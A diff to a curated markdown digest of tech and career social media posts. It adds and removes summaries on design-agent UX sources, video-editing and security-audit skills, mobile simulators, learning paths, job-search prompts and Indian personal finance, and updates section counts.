+  `George from 🕹prodmgmt.world` · `2026-10-23` · `13 replies · 15 reposts · 370 likes · 651 bookmarks · 20.9K …`
+  - **Essence:** George lists five sources to give a design agent: Laws of UX, Nielsen's 10 usability heuristics, the GOV.UK Design System, Inclusive Components by Heydon Pickering and Apple's Human Interface Guidelines. After the prototype builds, ask the system which usability heuristic each screen breaks, then make it highlight the exact element on the screen that causes each problem. A self-reply promotes his PM harness for Claude Code and Codex. Replies add the WAI-ARIA Authoring Practices for keyboard behaviour, a GOV.UK check (after an invalid form submit, focus the error summary and link each error to its field, tested by keyboard), and the point that heuristics do not stop an agent putting three …
+  - **Takeaway:** A short reading list plus a two-step critique loop you can paste into a design prompt.
+  - **Try it:** [lawsofux.com](https://lawsofux.com/) · [design-system.service.gov.uk](https://design-system.service.gov.uk/) · [inclusive-components.design](https://inclusive-components.design/)
+  - 🏷 ux, heuristics, design-systems, accessibility, agents
+- **[ffmpeg-skill: Claude edits finished videos from a folder with one prompt](https://x.com/guilhermebrasil/status/2113751145160061438)**  
+  `guilherme` · `2026-10-23` · `44 replies · 188 reposts · 2.9K likes · 5K bookmarks · …`
+  - **Essence:** Guilherme answers his own question about a video editing skill for Claude with ffmpeg-skill (kajisho5/ffmpeg-skill). Claude watches the video and edits it in high quality and fast, and he calls it the best he found for editing ready footage. In the thread he put several interview videos in a folder with the skill, described the result, and Claude joined them, added image effects, captions with correct timing and transitions. All edits are done by prompt. For simple edits with cuts, effects and captions it is enough; for motion graphics use Remotion, Brag or Hyperframe. Replies share alternatives such as SaneVideo, video-bitedit and heditor, and ask whether fine-tuning is possible or whether …
+  - **Takeaway:** A practical skill for cuts, captions and transitions. For animated graphics, pair it with Remotion.
+  - **Try it:** [github.com/kajisho5/ffmpeg-skill](https://github.com/kajisho5/ffmpeg-skill)
+  - 🏷 ffmpeg, video-editing, claude-skills, remotion
+- **[Internet Archive's free API gives Claude 17M films and 14M recordings for edits](https://x.com/ElliotPadfield/status/2113393903923581149)** 🎬  
+  `Elliot Padfield` · `2026-10-22` · `70 replies · 241 reposts · 3.6K likes · 8.3K bookmarks · …`
+  - **Essence:** Elliot says that if you edit video with Claude you can give it archive.org's free API (no key) and ask it to search the Prelinger and 78rpm collections for archival b-roll or period music. The collections include 10,000+ Prelinger films (public-domain stock footage), 187,000 78rpm records and 300,000+ live concert recordings. He suggests the clips suit artsy ads for tech. In replies, someone built an MCP for it (edigeh/broll-mcp), one user asks him to delete the post to avoid a tragedy of the commons, and others ask people to support the Internet Archive. A copyright caveat: footage can be public domain while a music recording can still get a Content ID claim.
+  - **Takeaway:** A free source of b-roll and old music for agent edits. Check each item's rights, and support the Archive.
+  - **Try it:** [archive.org/developers](https://archive.org/developers/) · [github.com/edigeh/broll-mcp](https://github.com/edigeh/broll-mcp)
+  - 🏷 internet-archive, b-roll, video-editing, public-domain, api
+- **[Cloudflare security-audit skill finds bugs even with cheap models; Vercel reviews free until Nov 10](https://x.com/jurbed/status/2112973191157252103)** ⭐  
+  `Juraj Bednar🏴💛🌘` · `2026-10-21` · `133 replies · 802 reposts · 8.7K likes · 16.2K bookmarks · …`
+  - **Essence:** Juraj recommends Cloudflare's security-audit skill (cloudflare/security-audit-skill): run it on all your software, even after a model has audited it, and it works in any agent harness. He says it works with Opus 5.5, then corrects himself that it does not work with GPT models. With free Minimax M3.1 it found critical bugs that Opus, Fable and Astra missed. He ends a run by writing 'fix all, commit, push, deploy', and tells you to have the agent reproduce each finding to verify it. Replies warn about the cost and limits: it eats a lot of tokens, frontier models can stop halfway when they find a real vulnerability, and one user asks how false positives are handled across repos. A related …
+  - **Takeaway:** Run it on your own repos with a cheap model, and verify each finding. The Vercel free window ends on 10 Nov 2026.
+  - **Try it:** [github.com/cloudflare/security-audit-skill](https://github.com/cloudflare/security-audit-skill)
+  - 🏷 security, audit, claude-skills, cloudflare, vercel
+- **[Gr8r Studio task manager: demo and repo, but replies say the license is missing](https://x.com/zahragr8r/status/2113188860121501711)** 🎬  
+  `Zahra` · `2026-10-22` · `20 replies · 39 reposts · 701 likes · 1.1K bookmarks · …`
+  - **Essence:** Zahra shares an open-source task manager with a demo (gr8r-taskmanagement on Vercel) and the GitHub repo gr8rstudio/gr8r-studio, saying it already has 1,000+ stars and that Claude makes her team very fast. Three replies point out it is not fully open source without a license. Other replies in the thread are more useful than the post: Guillermo Rauch says Vercel Security Reviews found 6,817 vulnerabilities in 24 hours and are free until 10 Nov, and Matt Pocock's prompt of the day is 'How do we make this change fully verifiable?', which makes the agent verify its changes by signing up to real services and clicking through the frontend. Cloudflare's security-audit skill is also promoted in a …
+  - **Takeaway:** The project itself is minor. Keep the 'fully verifiable' prompt and the Vercel free-review window (until 10 Nov).
+  - **Try it:** [github.com/gr8rstudio/gr8r-studio](https://github.com/gr8rstudio/gr8r-studio/) · [gr8r-taskmanagement.vercel.app](https://gr8r-taskmanagement.vercel.app/)
+  - 🏷 open-source, task-manager, licensing, verification-prompt
+- **[Details MCP: 'give claude better taste' for UI work](https://x.com/details_so/status/2112972928161808414)**  
+  `Details` · `2026-10-21` · `19 replies · 53 reposts · 1.7K likes · 3.4K bookmarks · …`
+  - **Essence:** Details posts one line, 'give claude better taste', with the link details.so/mcp. It is a design MCP for coding agents; the post has no more detail. In the thread the team asks a user which OS and browser they use after a bug report. Replies say impeccable.style does a similar job without a price tag, ask how the MCP passes motion references such as timing and easing that a screenshot cannot capture, and suggest that you can also save a page and hand it to Claude. Unrelated promoted replies fill the rest of the thread.
+  - **Takeaway:** Compare with impeccable and TasteSkill before you pay for another design layer.
+  - **Try it:** [details.so/mcp](https://details.so/mcp)
+  - 🏷 mcp, design-taste, frontend, claude
+- **[TasteSkill v2.1 adds dashboards, real app parts in landing pages and a frame check](https://x.com/LexnLin/status/2112674349132194185)** 🎬  
+  `Leon Lin` · `2026-10-20` · `48 replies · 67 reposts · 1.5K likes · 1.6K bookmarks · …`
+  - **Essence:** Leon releases TasteSkill v2.1, installed with npx skills add Leonxlnx/taste-skill. It now supports dashboards and app screens. Landing pages for software show real, working parts of the app and not fake mockups. A new frame check looks for a missing title on the first screen, uneven margins, random alignment and empty gaps. There are also new motion recipes and more layouts, and one skill now covers everything including redesigns, with the old styles moved to taste-skill-classics and the image skills to imagegen-skills. The launch video was made with Opus 5.5. He says v2.2 is in work and that full app design is not supported yet. Replies praise the fast shipping (v2 was one week earlier). …
+  - **Takeaway:** A quick follow-up release. Update if you already use TasteSkill, and test the new frame check on a dashboard.
+  - **Try it:** [github.com/Leonxlnx/taste-skill](https://github.com/Leonxlnx/taste-skill)
+  - 🏷 taste-skill, ui, dashboards, claude-skills
+- **[Revyl: free cloud workspace for mobile developers with iOS and Android simulators](https://x.com/hxyden/status/2112251663218286944)** 🎬  
+  `hayden` · `2026-10-19` · `7 replies · 12 reposts · 147 likes · 161 bookmarks · 14.1K …`
+  - **Essence:** Hayden announces a free cloud workspace for every mobile developer from Revyl: cloud builds, iOS and Android simulators, app maps and proof on every PR. In the thread you can start free at revyl.com, and if you need a thousand devices you can get them, but not for free. Replies note the free tier is only 20 concurrent devices and ask whether it is a dual-platform simulator service and whether remote control of simulators works for local development. Revyl later adds web support, with a full replay, every step, logs, network and performance on one timeline, and the company confirms in replies that web is live.
+  - **Takeaway:** A free trial for cloud simulators and PR proof. Check the 20-device limit and whether it fits your build flow.
+  - **Try it:** [revyl.com](https://revyl.com/)
+  - 🏷 mobile-dev, simulators, cloud-devices, ci
 - **[I built Kal, an interpreted programming language from scratch!](https://www.reddit.com/r/IndiaTech/comments/1uf263n/i_built_kal_an_interpreted_programming_language/)**  
   `u/KILLinefficiency` · `2026-06-25` · `↑21 · 13 comments`
   - **Essence:** OP releases v0.1.0 of Kal, a lightweight interpreted language written from scratch in C++ with no third-party dependencies, GPL v3, mixing paradigms and embeddable into C++, Python and JavaScript; he ships a website and GitHub repo and asks for stars. Replies ask whether it was a team effort — OP says he's a solo dev and that this first release took four years with no libraries and no AI — plus what Kal is good for today (CLI tools and embedding) and what the long-term goal is (still being defined). Commenters are impressed by the codebase at a glance, with one reminiscing about dreaming of writing his own OS, and the thread's tone is supportive rather than critical.
@@ -986,9 +1166,9 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
 
 <a id="programming-cs-learning"></a>
 
-## Programming & CS Learning (52)
+## Programming & CS Learning (53)
 
-<details><summary><b>Show 52 entries</b> — Courses, playlists, books, tutorials, CS concepts (DB, OS, systems, ML theory), learning roadmaps</summary>
+<details><summary><b>Show 53 entries</b> — Courses, playlists, books, tutorials, CS concepts (DB, OS, systems, ML theory), learning roadmaps</summary>
 
 - **[Honeypot fields: a fake hidden input that catches bots](https://x.com/CodeWithTamara/status/2100940633896604051)**  
   `Tamara Martinović` · `2026-09-18` · `73 replies · 44 reposts · 1.2K likes · 82.9K views · 356 …`
@@ -1251,6 +1431,12 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
   - **Takeaway:** A launch buried by a copying scandal: useful as a reminder to document provenance and licensing before monetizing an educational product, whatever the truth here.
   - **Try it:** [sys0.in](https://sys0.in/) · [breakscale.tech](https://breakscale.tech/)
   - 🏷 systems-programming, education, plagiarism, open-source, launch
+- **[systemdesign.io link, plus a DP path: CSES, AtCoder, LeetCode hard, Codeforces](https://x.com/divyansh_1729/status/2114400113515012360)**  
+  `divyansh` · `2026-10-25` · `119 replies · 1.4K reposts · 15.6K likes · 51.1K bookmarks …`
+  - **Essence:** divyansh posts only the link systemdesign.io with 'nerds, thank me later'. The post got 15.6K likes, 51K bookmarks and 2.5M views. The useful part is a self-reply on learning DP from first principles: start with CSES dynamic programming and the AtCoder DP contest, then move to LeetCode hard DP and non-standard Codeforces DP problems, so you learn to think and not to memorize patterns. Other thread posts are promotion. Replies add the Backend from First Principles site (a 27-chapter reference at backend-from-first-principle.vercel.app) and selftrackr.vercel.app. One reply says nothing is built yet, so the link alone proves little.
+  - **Takeaway:** Save the DP path. The systemdesign.io link has no description, so check what it offers before you rely on it.
+  - **Try it:** [systemdesign.io](https://systemdesign.io/) · [backend-from-first-principle.vercel.app](https://backend-from-first-principle.vercel.app/)
+  - 🏷 system-design, dp, cses, atcoder, learning-path
 - **[Discovering Each Other Without Addresses | The Zeroconf Stack](https://www.reddit.com/r/Btechtards/comments/1uamn7x/discovering_each_other_without_addresses_the/)**  
   `u/East-Muffin-6472` · `2026-06-20` · `↑9 · 5 comments`
   - **Essence:** OP explains how wanting four Raspberry Pis to auto-appear on his Mac led him down the Zeroconf rabbit hole — mDNS, DNS-SD and WiFi-Direct — written as a student-teacher dialogue and tied to his use of the grove library in the smoltorrent project, covering how AirDrop works with no router via AWDL time-slicing. The small reply section is dominated by a sharp question: 'Is this AI generated?' OP admits the post is a reformed conversation with Claude that he turned into a blog, and defends the piece otherwise. Tone is friendly, with a couple of quick thanks.
@@ -1273,9 +1459,9 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
 
 <a id="interviews-oa-dsa"></a>
 
-## Interviews, OA & DSA (34)
+## Interviews, OA & DSA (32)
 
-<details><summary><b>Show 34 entries</b> — Online assessments, interview experiences/questions, DSA prep, system design/HLD prep, contest problems</summary>
+<details><summary><b>Show 32 entries</b> — Online assessments, interview experiences/questions, DSA prep, system design/HLD prep, contest problems</summary>
 
 - **[5 multithreading design problems for Rubrik, Databricks and Google](https://x.com/86pushkar24/status/2036293854647951583)**  
   `Pushkar` · `2026-03-24` · `8 replies · 36 reposts · 337 likes · 15.6K views · 520 …`
@@ -1308,12 +1494,6 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
   - **Takeaway:** An attempt to productize crowdsourced interview experiences - watch whether the waitlist converts.
   - **Try it:** [preparchive.in](https://preparchive.in)
   - 🏷 interview-prep, startup, waitlist, database
-- **[MLSys 2026 Graph Scheduling Competition - design a JSON schedule](https://x.com/googlestudents/status/2021264553225367989)**  
-  `Google Students` · `2026-02-10` · `7 replies · 80 reposts · 1.2K likes · 98.3K views · 1.2K …`
-  - **Essence:** Google Students promotes the MLSys 2026 Graph Scheduling Competition: given a complex AI workload and a tiny high-speed memory scratchpad, design a schedule (just a JSON file) that moves data in and out efficiently to minimize latency - 'like a high-stakes game of inventory management'. Open to students, researchers, hobbyists and puzzle-solvers worldwide, with a registration link. The only reply asks Google to bring Hash Code back; 1,181 likes and 1,193 bookmarks.
-  - **Takeaway:** A global, open-to-anyone optimization contest with a low barrier to entry (JSON schedule) - good portfolio signal.
-  - **Try it:** [goo.gle/4ktgyyb](https://goo.gle/4ktgyyb)
-  - 🏷 coding-competition, mlsys, optimization, contest
 - **['I conducted 50+ interviews at Google - here is how to pass'](https://x.com/abhishekcode42/status/2012545006423425088)** ⭐  
   `Abhishek` · `2026-01-17` · `2 replies · 42 reposts · 498 likes · 49.3K views · 989 …`
   - **Essence:** Abhishek's X article 'I conducted 50+ interviews at Google. Here is how to pass.' argues that after 50+ technical interviews he noticed specific patterns separating candidates, and breaks down the 5 major areas where most ... (excerpt truncated in the record). No reply discussion is captured; 498 likes, 989 bookmarks and 49K views.
@@ -1388,12 +1568,6 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
   - **Takeaway:** A concrete inference-on-hardware interview project template; check the repo for batching patterns.
   - **Try it:** [github.com/sh4shv4t/inference-forge](https://github.com/sh4shv4t/inference-forge)
   - 🏷 interviews, inference, take-home, india-ai-labs
-- **[Google's The Big Code competition is open to 2027-2029 grads, not 2026](https://x.com/okbhaicool/status/2025257184146473034)**  
-  `TryingToFindAGoodUsername` · `2026-02-21` · `11 replies · 8 reposts · 142 likes · 100 bookmarks · 10K …`
-  - **Essence:** A quick signal boost for The Big Code, a Google coding competition hosted on HackerEarth. The important detail is eligibility: it is open to 2027, 2028 and 2029 graduates, and the poster - a 2026 grad - spends the thread complaining that his batch is excluded. Replies confirm the same frustration and ask whether this replaces Google Hash Code or Code Jam, which Google discontinued. For anyone in the eligible batches, the value is the direct HackerEarth link; for everyone else, it is a reminder to check graduation-year filters before investing time in a contest.
-  - **Takeaway:** Worth a look only if you graduate in 2027-2029; the thread is more useful for the eligibility warning than the competition itself.
-  - **Try it:** [www.hackerearth.com/lp/challenges/the-big-code](https://www.hackerearth.com/lp/challenges/the-big-code)
-  - 🏷 google, coding-competition, hackerearth, students, eligibility
 - **[Rubrik OA | 2027 Grad | 50+LPA CTC | Double Camera On](https://www.reddit.com/r/Btechtards/comments/1vpqsba/rubrik_oa_2027_grad_50lpa_ctc_double_camera_on/)**  
   `u/Brilliant_Card_447` · `2026-08-16` · `↑24 · 14 comments`
   - **Essence:** OP posts the Rubrik OA problem for 2027 grads (50+ LPA CTC, double-camera proctoring): given N modules each with storage S and exposure E, activate the maximum number of modules so no selected module can compromise another (S[i] > E[i] for all i). Replies mostly ask which college/branch this came from and what the base comp is, while one commenter calls it 'mad easy for Rubrik' and outlines the solution — sort by exposure and greedily take modules whose storage exceeds the current exposure, effectively reverse merge-intervals. Another top reply explains the double-camera setup: a second camera captures your full body, face and hands so you can't cheat.
@@ -1464,9 +1638,9 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
 
 <a id="jobs-careers-compensation"></a>
 
-## Jobs, Careers & Compensation (31)
+## Jobs, Careers & Compensation (29)
 
-<details><summary><b>Show 31 entries</b> — Hiring posts, referral/job openings, offer comparisons, salary/CTC data, resume/ATS tips, off-campus application advice</summary>
+<details><summary><b>Show 29 entries</b> — Hiring posts, referral/job openings, offer comparisons, salary/CTC data, resume/ATS tips, off-campus application advice</summary>
 
 - **[Blind's 1.5k-comment 'worst company you've worked for' thread](https://x.com/jain_harshit/status/2095520438353109190)**  
   `Harshit Jain` · `2026-09-03` · `5 replies · 2 reposts · 101 likes · 13.7K views · 24 …`
@@ -1483,11 +1657,6 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
   - **Essence:** Vyom posts a Rippling SDE intern OA alongside the claim they pay close to 70 CTC for SDE-1. His thread hedges the number - base itself is 44, commenters report different figures - and notes tougher OAs don't always mean bigger pay (Infosys). Replies debate how much of the 70 CTC is actual liquidity, call it crazy motivation to grind LeetCode, argue tech roles shouldn't be 70k without experience, and ask what 70 CTC even means; 283 likes and 268 bookmarks.
   - **Takeaway:** A comp benchmark plus OA signal for Rippling India - a data point in the high-paying-fresher sweepstakes.
   - 🏷 rippling, compensation, oa, sde-interview, india
-- **[Peakflo (YC W22) hiring remote ML intern, 50k/month stipend](https://x.com/Ayushi_sharma02/status/2021819146137382961)**  
-  `Ayushi` · `2026-02-12` · `124 replies · 6 reposts · 302 likes · 19.5K views · 165 …`
-  - **Essence:** Ayushi posts a #hiring #remote opening: Peakflo (YC W22) hiring a Machine Learning Intern for 2025/2026/2027 batches, remote India, 50k/month stipend, skills needed are machine learning, prompt engineering, Python and NLP; her thread tells people to apply and check DMs. Replies are mostly 'interested', one person asks about full-time AI/ML roles, another about cybersecurity or web3 openings for freshers; 302 likes and 165 bookmarks.
-  - **Takeaway:** A concrete YC startup intern stipend data point for India (50k/month, remote).
-  - 🏷 hiring, ml-intern, yc, remote-work, india
 - **['The guide to getting a job with cold email' (X article)](https://x.com/benln/status/2018035287851704556)** ⭐  
   `Ben Lang` · `2026-02-01` · `53 replies · 193 reposts · 2.4K likes · 639K views · 6.4K …`
   - **Essence:** Ben Lang's X article 'The guide to getting a job with cold email' opens with things he believes about emailing startups: you can email any company you would like to work for, no matter what - true even if they don't have a job posted on their ... (excerpt truncated in the record). No reply discussion is captured; the post collects 2,401 likes, 6,374 bookmarks and 638K views.
@@ -1498,12 +1667,6 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
   - **Essence:** Vaibhav lists high-paying companies that hire SDE-1s 100% remote in India with approximate total comp: GitLab 55-75 LPA, Shopify 40-55, Atlassian 35-50, Coinbase 45-65, Stripe 45-70, Elastic 35-55, Automattic 30-45, Zapier 25-40 - no office mandates, no relocation - and asks which remote company you'd aim for. Replies pick Stripe/GitLab/Atlassian ('life is too short to aim low'), one starts preparing sheets for all of them, and another asks what these companies actually look for in profiles (open source?); 236 likes and 331 bookmarks.
   - **Takeaway:** An India remote-comp benchmark across globally distributed companies - a quick calibrator for offers.
   - 🏷 remote-jobs, compensation, india, sde-1
-- **[Four AI and tech policy fellowships to apply to](https://x.com/Oluwanonso_Esq/status/2013577008094052502)**  
-  `Equivocator™` · `2026-01-20` · `55 reposts · 326 likes · 24.6K views · 557 bookmarks`
-  - **Essence:** Equivocator lists AI and tech policy fellowships to apply to: a Fellowship in AI Ethics (Harvard), Technologist-in-Residence, Mila Indigenous Pathfinders in AI, and the IAPS AI Policy Fellowship 2026, each with an lnkd.in application link. No reply discussion is captured; 55 reposts, 326 likes and 557 bookmarks on 24.6K views.
-  - **Takeaway:** A ready-made list of AI-governance fellowship applications with direct links - good for policy-interested candidates.
-  - **Try it:** [lnkd.in/gS_cBZU7](https://lnkd.in/gS_cBZU7) · [lnkd.in/gvyV-6Qd](https://lnkd.in/gvyV-6Qd) · [lnkd.in/gtDmdWmX](https://lnkd.in/gtDmdWmX) · [lnkd.in/gbg4r3_b](https://lnkd.in/gbg4r3_b)
-  - 🏷 fellowships, ai-policy, opportunities, applications
 - **[Get paid to train AI on DataAnnotation - $20-30/hour](https://x.com/Timmysofine/status/2013545695320440992)** ⭐  
   `Oluwatimileyin✨🦋` · `2026-01-20` · `97 replies · 486 reposts · 4.2K likes · 531.7K views · 8.1K …`
   - **Essence:** Timmy describes Data Annotation: you apply, take a little test to make sure you understand the idea, then get paid to train AI, with different projects opening up that you can log in and complete whenever; pay starts at $20/hour and he's seen $30 for certain projects. His thread drops the account link and later reveals the catch - you need a paid VPN and a US eSIM number, text-app numbers don't work. Replies ask if it's free to join, joke that getting in requires strong juju, and report error messages; 4,238 likes, 8,135 bookmarks and 531K views.
@@ -1592,12 +1755,11 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
   - **Essence:** OP maps the Indian hackathon-based hiring calendar for 2026: Jan-Feb - Microsoft Imagine Cup India qualifiers, MLH-backed hackathons at Indian colleges, early campus scouting by startups; Feb-Mar - Google Summer of Code applications and open-source programs via IITs, NITs, IIITs and community OSS internships; Mar-Apr - TCS CodeVita regional and national rounds, Infosys HackWithInfy, Cognizant and Wipro coding challenges; Apr-May - Accenture Hack Diva, Deloitte India tech challenges, fintech and SaaS startup hackathons; May-Aug - Amazon HackOn, Flipkart GRiD, Adobe India Hackathon, Bajaj HackRx, Walmart Sparkathon, and Paytm, PhonePe and Swiggy tech events. One captured reply just says …
   - **Takeaway:** Month-by-month map of Indian hackathon hiring - genuinely useful planning resource for students.
   - 🏷 hackathons, india hiring, gsoc, campus hiring, coding competitions
-- **[Hacktober with Kestra: 2 Macbook Neos, iPads and vouchers for top OSS contributors](https://x.com/arsh_goyal/status/2106444936988274745)**  
-  `Arsh Goyal` · `2026-10-03` · `12 replies · 3 reposts · 130 likes · 9.2K views · 135 …`
-  - **Essence:** Arsh Goyal is organizing a Hacktober with Kestra: 2 Macbook Neos, iPads and Amazon vouchers for the top 6 contributors, plus merchandise for all accepted PRs — register via the form, details at kestra.io/hacktober. The 12 replies are pure signups ('Done', 'Count me in', 'Submitted') with one question on expected contributions and one hiring reply, so there is no technical substance beyond the announcement. 12 replies, 130 likes, 135 bookmarks. Note: time-bound to October 2026, links rot after the event.
-  - **Takeaway:** Hardware-prize OSS event if you are contributing this October; ignore once the event ends.
-  - **Try it:** [kestra.io/hacktober](https://kestra.io/hacktober) · [docs.google.com/forms/d/e/1FAIpQLSfHgC4RsK9NK51gLUxB …](https://docs.google.com/forms/d/e/1FAIpQLSfHgC4RsK9NK51gLUxBYwpUQwLB45SJQB365G0MAIrKLlnnSg/viewform)
-  - 🏷 hacktoberfest, open-source, events, prizes
+- **[Four-prompt chain claims ChatGPT agent mode applied to 500 jobs overnight](https://x.com/nikola_mr64990/status/2117896466970906668)**  
+  `Mr Nikola` · `2026-11-04` · `112 replies · 331 reposts · 3.6K likes · 6.6K bookmarks · …`
+  - **Essence:** Mr Nikola says ChatGPT applied to 500 jobs while he slept and 12 interview calls came within 24 hours. The thread gives the prompts. Step 1: upload your resume and ask ChatGPT to act as a senior recruiter and list 20 job titles you fit with the ATS keywords for each. Step 2: rewrite the resume into a master template with the Google XYZ formula and no red flags. Step 3: turn on Agent mode with the + sign so ChatGPT can open LinkedIn and Indeed. Step 4: ask it to find matching postings from the last 7 days and build a spreadsheet with links, match scores and a tailored resume version for each. The post has about 1.1M views, but the replies are mostly doubtful: 'clickbait', 'seems untrue', and …
+  - **Takeaway:** Steps 1, 2 and 4 are a sound resume and tracking routine. The 500-applications and 12-calls result is unproven.
+  - 🏷 chatgpt, job-search, resume, ats, agent-mode
 - **[JPMorgan Chase India Salary Megathread (2026)](https://www.reddit.com/r/jpmorganchase_india/comments/1sxer5x/jpmorgan_chase_india_salary_megathread_2026/)** ⭐  
   `u/Think-Way-510` · `2026-04-27` · `↑227 · 157 comments`
   - **Essence:** OP invites JPMorgan Chase India employees to post role, LOB, education, experience, CTC and a 1-10 work-life score, and the 157 replies deliver a genuine comp dataset: an investment-banking VP at 34 reports INR 1.1cr base plus 70-100% bonus (~INR 2cr), a markets QR with 4.5 YOE reports 53+30 (WLB 3), an SDE-2 with 1.9 YOE 21+6 (WLB 7), a senior finance associate 15+5 (WLB 8), non-tech bands of 8-17 LPA (analyst), 15-25 (associate), 25-45 (senior associate), an 18-year ED in product management at 1.2cr + 33L (WLB 8), a 9-year PM at 90+20 with WLB 2, and a 4.5-year SWE at 30 fixed who claims full remote and ~2 hours a day 'cuz of claude'. Several people use the thread to ask what base to …
@@ -1641,9 +1803,9 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
 
 <a id="quant-trading"></a>
 
-## Quant & Trading (24)
+## Quant & Trading (23)
 
-<details><summary><b>Show 24 entries</b> — Quant trading/research roles, HFT firms, trading competitions, market structure, quant interview prep, trading math</summary>
+<details><summary><b>Show 23 entries</b> — Quant trading/research roles, HFT firms, trading competitions, market structure, quant interview prep, trading math</summary>
 
 - **[Quant Memo: free quantitative-finance learning site enters beta](https://x.com/PriyanshuP1405/status/2091470216903692680)**  
   `Priyanshu Priyank` · `2026-08-23` · `10 replies · 10 reposts · 83 likes · 35.4K views · 95 …`
@@ -1662,11 +1824,6 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
   - **Essence:** Pulkit says he had to prepare this computer science round even for a senior HFT role, and all companies ask these questions of freshers: OS (process vs thread, virtual memory/paging/thrashing, fragmentation, semaphore vs mutex, producer-consumer, deadlock and Banker's algorithm, scheduling, RAID, mapping), DBMS (ACID, normalization, conflict serializability, concurrency protocols, locks, indexing, vertical vs horizontal scaling), Computer Networks (TCP vs UDP, types of network delays, ...). His self-thread adds that when he got the HFT offer the hardest interview was multithreading - even more important for seniors - with the LeetCode concurrency list, and replies ask whether HFTs want only …
   - **Takeaway:** The canonical HFT/fintech CS fundamentals checklist - heavily saved by interview preppers.
   - 🏷 hft, interview-prep, operating-systems, dbms, computer-networks
-- **[List of upcoming quant competitions (Google Drive doc)](https://x.com/PtrPomorski/status/2015800176418414608)**  
-  `Piotr Pomorski` · `2026-01-26` · `1 reply · 46 reposts · 575 likes · 35.7K views · 821 …`
-  - **Essence:** Piotr Pomorski shares a document listing upcoming quant competitions for anyone interested (Google Drive link). No reply discussion is captured; 46 reposts, 575 likes and 821 bookmarks on 35.7K views.
-  - **Takeaway:** A saved calendar of quant trading competitions - useful for students targeting trading firms.
-  - 🏷 quant, competitions, trading-contests, opportunities
 - **[Same HFT CS question list - OS, DBMS, networks for freshers](https://x.com/pulkit_mittal_/status/2007431866643820849)**  
   `pulkit mittal` · `2026-01-02` · `6 replies · 61 reposts · 781 likes · 102.5K views · 1.4K …`
   - **Essence:** Pulkit's earlier cut of the same HFT CS question list: the Operating Systems, DBMS and Computer Networks questions companies ask freshers, which he had to prepare even interviewing for a senior role (process vs thread, thrashing, Banker's algorithm, ACID, conflict serializability, TCP vs UDP, ...). His thread adds revision tips - implement concepts like HTTP or consistent hashing for real, keep notes in a simple YAML file uploaded to GitHub so you can revise from the mobile GitHub app. Replies ask how often they practice and how to keep revising, ask how many rounds HFTs run, and joke 'why you not join yet man'; 781 likes and 1,405 bookmarks.
@@ -1779,9 +1936,9 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
 
 <a id="personal-finance-money"></a>
 
-## Personal Finance & Money (9)
+## Personal Finance & Money (10)
 
-<details><summary><b>Show 9 entries</b> — Credit cards, loans, insurance, investing, stocks/gold/crypto money matters, taxes, frugality, income ideas</summary>
+<details><summary><b>Show 10 entries</b> — Credit cards, loans, insurance, investing, stocks/gold/crypto money matters, taxes, frugality, income ideas</summary>
 
 - **[InsiderWave: app that tracks politicians' financial disclosures](https://x.com/legen_eth/status/2057867757404688900)**  
   `legen` · `2026-05-22` · `12 replies · 16 reposts · 215 likes · 58.9K views · 739 …`
@@ -1824,6 +1981,11 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
   - **Essence:** OP, unpaid, makes the case for the Axis Magnus card: it offers up to 15-20% rewards on spending and suits anyone earning over Rs18L as a primary card; the Rs10,000 + GST fee is offset by a Rs10K TataCliq voucher or domestic flight (he recommends the voucher), so you effectively pay GST only; ideal spend is Rs12-15L a year, though Rs5-6L including rent works. He does the math - 1 Edge Reward point per Rs16.66 means about 30,000 ER on Rs5L, convertible at 5:4 into 24,000 Vistara/SpiceJet miles (a BLR-BOM flight costs 4,500 CV points versus Rs4,500 cash fares) or Marriott Bonvoy - and shows how to max it: rent, groceries, bills and daily spend on the card (Swiggy, Amazon, instead of UPI) plus …
   - **Takeaway:** Detailed Indian credit-card rewards teardown with real point-to-miles conversion math.
   - 🏷 credit card, axis magnus, rewards, miles, india finance
+- **[Car-loan trick: lock 10 lakh in an FD and borrow 9 lakh as an overdraft instead](https://x.com/Mr_Vivekji/status/2113100715476516881)**  
+  `VIVEK` · `2026-10-21` · `52 replies · 53 reposts · 435 likes · 682 bookmarks · 73.8K …`
+  - **Essence:** Vivek argues that if you have 10 lakh in the bank you should not take a car loan. Keep the 10 lakh in an FD for 7 years at 6%, take a 9 lakh overdraft at 7%, and buy the car. His figures: FD maturity 15.17 lakh rupees, overdraft EMI 13,583 for 84 months, interest earned 5.17 lakh, interest paid 2.41 lakh, total gain 2.76 lakh. He says car loans carry higher rates and processing fees, while an overdraft costs about 1% more than the FD rate with no processing charge. The post quotes a debate on whether to take a loan when you can pay cash. Replies push back: you lose the liquidity that is the point of an FD, you pay interest on your own money while the FD interest is taxed, and many people …
+  - **Takeaway:** An interesting structure with real trade-offs: liquidity, tax on FD interest and a modest gain. Check the numbers with your own bank.
+  - 🏷 fd, overdraft, car-loan, india-finance
 - **[Axis Bank inflated my education loan by ₹6.88 lakhs overnight during complaint](https://www.reddit.com/r/CreditCardsIndia/comments/1sscc7m/axis_bank_inflated_my_education_loan_by_688_lakhs/)** ⭐  
   `u/davidben09` · `2026-04-22` · `↑410 · 34 comments`
   - **Essence:** OP documents a ₹25 lakh Axis education loan where 54 EMIs were paid with zero overdue, yet on foreclosure the branch quoted ₹6.88 lakhs more after a 27.02.2026 batch operation re-booked all instalments back to 2022, added 50+ offsetting entries, jumped outstanding from ₹13,08,775 to ₹19,97,037 and silently extended tenure from 138 to 158 months — all while his complaint was open. Replies confirm a pattern: PNB and UBI borrowers describe identical education-loan misreporting that was resolved only after RBI Lokpal complaints, one says 'Axis is well known for crap like this', and others hand him a concrete escalation path (ombudsman, appellate authority, specific RBI email IDs like …
@@ -1834,9 +1996,9 @@ and a one-line **takeaway** — you shouldn't need to click through to get the p
 
 <a id="startups-product-marketing"></a>
 
-## Startups, Product & Marketing (41)
+## Startups, Product & Marketing (56)
 
